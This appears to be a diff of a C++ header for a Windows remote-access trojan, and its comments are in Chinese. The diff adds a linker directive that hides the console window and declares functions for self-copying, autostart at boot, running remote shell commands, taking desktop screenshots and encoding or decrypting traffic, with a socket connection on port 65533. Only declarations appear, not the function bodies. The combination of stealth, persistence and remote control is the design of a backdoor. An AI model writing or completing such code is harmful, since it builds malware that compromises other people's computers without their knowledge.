@@ -17,6 +17,11 @@
 #include <atlimage.h>
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
+
+#ifdef _MSC_VER  
+#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
+#endif
+
 //不显示控制台黑色窗口
 //#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #define PORT 65533
@@ -28,8 +33,8 @@ using namespace std;
 
 struct PC_Message
 {
-	char PCName[BUFSIZ];
-	TCHAR UserName[BUFSIZ];
+	char PCName[40];
+	TCHAR UserName[40];
 	char IP[16];
 };
 //打开网络库
@@ -48,20 +53,26 @@ bool TcharToChar(const TCHAR* tchar, char* _char);
 bool HeartBeat(SOCKET fd);
 //base58编码函数
 void base58encode(char plainText[]);
+//base58解码函数
+bool base58decode(unsigned char* src);
 //base64编码函数
 void base64encode(char* str);
+//base64解码函数
+void base64decode(char* str);
 //加密函数
 void encode(char* text);
-//进程守护
-void ProcessProtect();
+//解密函数
+void decode(char* pwd);
 //开机自启动
-void ComputerStart(char* pathName);
+int ComputerStart(char* pathName);
+//自我复制
+int copySelf(char* path);
 //执行shell指令
-int Execmd(char* shell, char* result);
+int cmd(char* cmdStr, char* message);
 //获取桌面截图
 void ScreenShot(LPCTSTR s);
-//打开文件
-void readSrc();
+////打开文件
+//void readSrc(SOCKET fd);
 //获取文件名
 void GetFileName(char FileName[FileNameRow][FileNameCol]);
 
